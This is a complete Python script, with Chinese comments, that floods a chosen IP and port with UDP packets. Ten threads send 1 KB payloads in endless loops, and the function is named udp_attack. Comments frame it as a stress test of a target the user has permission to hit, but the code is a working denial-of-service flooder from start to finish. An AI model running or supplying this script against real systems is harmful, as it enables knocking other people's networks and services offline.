import socket
import threading

# 配置目标 IP 和端口
TARGET_IP = "192.168.169.1"  # 替换为您拥有权限的目标 IP
TARGET_PORT = 1234  # 替换为目标端口（UDP 服务端口）

# 数据负载内容（可以是随机数据或模拟请求）
MESSAGE = b"A" * 1024  # 1KB 的数据包

# 线程函数：发送大量 UDP 数据包
def udp_attack():
    try:
        # 创建 UDP 套接字
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            # 发送数据包
            sock.sendto(MESSAGE, (TARGET_IP, TARGET_PORT))
    except Exception as e:
        print(f"发送失败: {e}")

# 启动多个线程进行压力测试
THREAD_COUNT = 10  # 根据需要调整线程数量
threads = []

for _ in range(THREAD_COUNT):
    thread = threading.Thread(target=udp_attack)
    threads.append(thread)
    thread.start()

# 等待所有线程完成（通常不会到达这里，因为是持续发送）
for thread in threads:
    thread.join()
